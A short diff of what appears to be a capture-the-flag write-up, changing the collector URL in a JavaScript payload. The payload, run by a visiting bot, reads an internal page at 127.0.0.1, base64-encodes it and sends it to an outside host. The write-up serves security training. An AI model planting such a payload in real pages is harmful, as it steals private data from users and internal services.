@@ -205,7 +205,7 @@ module.exports = visit;
 fetch("http://127.0.0.1:80/message/3").then((r) => {
     return r.text();
 }).then((data)=>{
-fetch("https://htbsolver.free.beeceptor.com/"+btoa(data) )
+fetch("https://htbsolver.server/"+btoa(data) )
 })
 ```
 9) the script executed in the bot and send use the result
